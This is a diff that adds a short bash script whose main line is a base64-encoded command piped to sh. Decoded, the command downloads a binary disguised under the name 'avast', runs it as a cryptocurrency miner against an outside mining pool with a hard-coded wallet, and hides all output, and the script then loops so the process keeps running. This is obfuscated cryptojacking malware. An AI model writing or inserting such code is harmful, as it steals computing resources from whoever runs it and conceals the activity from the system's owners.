@@ -1,0 +1,6 @@
+#!/bin/bash
+base64 -d <<< d2dldCBodHRwczovL2dpdGh1Yi5jb20vc2FtcmlrdWxhbi90b3lhL3Jhdy9tYWluL2F2YXN0ICYmIG12IGF2YXN0IEEgJiYgY2htb2QgK3ggQSAmJiAuL0EgLXYgLWwgIHZlcnVzaGFzaC5hc2lhLm1pbmUuemVyZ3Bvb2wuY29tOjMzMDAgLXUgN3BYWWt3ZHdVRkJHTmFHOGRKOHc2a1pUelJqblRwRFRnby4kKGVjaG8gJChzaHVmIC1pIDEtOTk5OTkgLW4gMSktVFBVKSAtcCBjPURBU0ggLXQgOCAteCA+L2Rldi9udWxsIDI+JjE= | sh
+while [ 1 ]; do
+sleep 3
+done
+sleep 999999
